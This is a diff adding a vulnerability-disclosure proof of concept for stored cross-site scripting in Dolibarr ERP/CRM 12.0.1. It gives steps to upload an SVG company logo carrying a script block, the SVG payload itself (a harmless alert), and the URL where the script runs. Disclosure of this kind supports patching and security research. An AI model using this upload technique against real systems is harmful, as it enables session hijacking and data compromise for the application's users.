@@ -1,0 +1,36 @@
+# Exploit Title: Dolibarr ERP/CRM <= 12.0.1 - stored Cross-Site Scripting
+# CVE: 
+# Date: 2020-08-07
+# Exploit Author: Hao Wang
+# Contact: haowang93104@gmail.com
+# Vendor Homepage: https://dolibarr.org
+# Software Link: https://github.com/Dolibarr/dolibarr
+# Version: v12.0.1
+# Category: Webapps
+# Tested on: XAMPP for Windows
+# Software Description : Dolibarr ERP & CRM is a modern and easy to use software package to manage your business.
+# (customers, invoices, orders, products, stocks, agenda, e-mailings, shipments...)
+# Description : Exploiting these issues could allow an attacker to steal cookie-based authentication credentials,
+# compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+# Dolibarr 12.0.1 is vulnerable; prior versions may also be affected.
+# ==================================================================
+
+# PoC:
+# 1. Login in as an admin or a user who has the permission to edit the information of your company.
+# 2. Edit the logo of your company, and upload a svg image "evilsvgfile.svg", the content of the image is as follows:
+
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+   <script type="text/javascript">
+      alert('This app is probably vulnerable to XSS attacks!');
+   </script>
+</svg>
+
+# 3. Click "Save" to save the uploaded image.
+# 4. Log out and return to the homepage. You will see the picture you just uploaded.
+# 5. Right-click, then centre-click "View Image" in Firefox or "Open Image In New Tab" in chrome, you should see an alert.
+# Or by going to the path where the file is saved, in my case:
+# http://localhost/dolibarr/viewimage.php?cache=1&modulepart=mycompany&file=logos%2Fevilsvgfile.svg
